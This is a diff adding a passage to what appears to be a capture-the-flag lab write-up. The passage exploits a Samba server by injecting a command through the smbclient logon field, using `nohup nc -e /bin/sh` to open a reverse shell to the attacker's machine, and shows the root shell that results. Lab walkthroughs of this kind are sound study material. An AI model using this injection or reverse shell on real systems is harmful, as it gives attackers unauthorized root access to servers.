@@ -470,4 +470,26 @@ smbmap -H 10.10.10.3
 
 ```
 
+Let's try to break in with the known samba vulnerability since the tmp directory has read and write permission. Use smbclient command with no password into the tmp directory as shown below. At the smb: \> prompt, enter logon command with reverse shell back to my attacking machine while it's waiting for the incoming reverse shell. 
 
+```bash
+# exploit samba in the first tmux session on the attacking machine
+smbclient --no-pass //10.10.10.3/tmp
+Anonymous login successful
+Try "help" to get a list of possible commands.
+smb: \> logon "/=`nohup nc -e /bin/sh 10.10.16.2 443`"
+Password: 
+session setup failed: NT_STATUS_IO_TIMEOUT
+smb: \> 
+
+# in prior to the samaba exploit, listen to the incoming reverse shell with netcat on the tcp port 443
+nc -nvlp 443
+listening on [any] 443 ...
+connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 40320
+id
+uid=0(root) gid=0(root)
+whoami
+root
+```
+
+As we can see in the above, the 
